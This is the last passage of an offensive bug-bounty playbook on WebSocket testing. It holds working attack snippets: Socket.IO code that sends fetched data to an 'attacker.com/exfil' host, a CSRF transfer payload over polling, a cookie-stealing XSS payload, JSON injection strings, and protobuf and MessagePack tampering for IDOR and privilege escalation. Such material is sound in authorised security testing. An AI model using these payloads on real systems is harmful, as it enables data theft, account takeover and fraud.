---
name: playbook-src-websocket-test-part3
description: "结构：上半原有是主线（握手 / Origin / CSWSH / 注入）；下半补充加深（走私、Socket.IO）。短表没点名时先握手+越权消息。（第 3/3 部分）"
tags: [playbook, src-hunting, websocket, test]
intent: offensive
---
```javascript
socket.emit('get_data', {id: 'admin'}, (response) => {
    // response may contain data the client shouldn't have access to
    fetch('https://attacker.com/exfil', {
        method: 'POST',
        body: JSON.stringify(response)
    });
});
```

### Polling fallback CSRF

Socket.IO falls back to HTTP long-polling when WebSocket is unavailable. The polling transport uses regular HTTP requests with cookies → susceptible to CSRF if no additional token verification:

```text
POST /socket.io/?EIO=4&transport=polling&sid=SESSION_ID
Content-Type: application/octet-stream

4{"type":2,"data":["transfer",{"to":"attacker","amount":1000}]}
```

---

## 10. WEBSOCKET MESSAGE INJECTION

### In intercepted connections (MITM on `ws://`)

If the application uses `ws://` (unencrypted), an attacker on the same network can inject messages:

```text
1. ARP spoofing or network position to intercept traffic
2. Identify WebSocket frames in TCP stream
3. Inject crafted frames between legitimate messages
4. Both client→server and server→client injection possible
```

### Application-level injection

When WebSocket messages are concatenated or interpolated without sanitization:

```javascript
// Vulnerable server-side handler:
socket.on('chat', (msg) => {
    // If msg contains JSON metacharacters:
    broadcast(`{"user":"${username}","msg":"${msg}"}`);
    // Injection: msg = '","admin":true,"msg":"hacked'
    // Result: {"user":"attacker","msg":"","admin":true,"msg":"hacked"}
});
```

### Stored XSS via WebSocket

```text
1. Send WebSocket message: <img src=x onerror=alert(document.cookie)>
2. Server stores message and broadcasts to all connected clients
3. If client renders message as HTML → stored XSS
4. All connected users affected simultaneously
```

---

## 11. BINARY WEBSOCKET MESSAGE MANIPULATION

### Protobuf deserialization

Applications using Protocol Buffers over WebSocket may be vulnerable to:

```text
1. Capture binary WebSocket frame
2. Decode protobuf structure (use protoc --decode_raw or protobuf-inspector)
3. Modify field values (e.g., change user_id, amount, role)
4. Re-encode and send modified frame
5. Server deserializes without re-validating field constraints
```

```bash
### Decode captured binary frame
echo "CAPTURED_HEX" | xxd -r -p | protoc --decode_raw

### Output: field structure with types and values
### Modify, re-encode, send back through WebSocket
```

### MessagePack deserialization

```python
import msgpack
import websocket

ws = websocket.create_connection('wss://target.com/ws')

### Decode received binary message
raw = ws.recv()
data = msgpack.unpackb(raw, raw=False)
### data = {'action': 'get_balance', 'user_id': 123}

### Modify and re-send
data['user_id'] = 1  # IDOR: access admin's balance
ws.send(msgpack.packb(data), opcode=0x2)
```

### Type confusion attacks

Binary serialization formats may allow type confusion:

```text
### Original: user_id as integer (field type 0)
### Modified: user_id as string "1 OR 1=1" (field type 2)
### If server doesn't validate types after deserialization → SQL injection

### Original: is_admin as boolean false (0x00)
### Modified: is_admin as boolean true (0x01)
### Direct privilege escalation if server trusts deserialized values
```

### Tools for binary WebSocket analysis

| Tool | Purpose |
|------|---------|
| Burp Suite + SocketSleuth | Intercept and modify binary frames |
| `protobuf-inspector` | Decode unknown protobuf structures |
| `msgpack-tools` | Encode/decode MessagePack CLI |
| `wsdump` (websocket-client) | Raw frame capture and replay |
| Wireshark | Dissect WebSocket frames at protocol level |

> （续前：playbook-src-websocket-test 第 3/3 部分）
